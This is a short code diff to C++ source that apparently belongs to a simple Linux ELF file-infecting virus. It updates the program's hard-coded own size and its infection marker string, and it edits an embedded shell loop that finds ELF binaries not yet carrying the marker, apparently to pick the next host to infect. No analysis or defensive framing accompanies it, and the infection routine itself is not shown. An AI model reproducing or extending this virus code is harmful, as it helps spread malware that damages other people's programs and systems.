@@ -2,8 +2,9 @@
 #include <fstream>
 #include <unistd.h>
 
-#define MYSIZE 19527
-#define IDENTIFIER "SNYVWEUBBKAM"
+#define MYSIZE 19576
+
+const char* IDENTIFIER = "SNYVWEUBBKAM";
 
 using std::string;
 using std::ifstream;
@@ -55,7 +56,7 @@ int main (int argc, char** argv) {
         command += "`; \
 do \
 file $n | grep -q ELF && ( \
-grep -q PROBOTEST $n || \
+grep -q SNYVWEUBBKAM $n || \
 echo \"$n\" \
 ); \
 done | tail -1); \
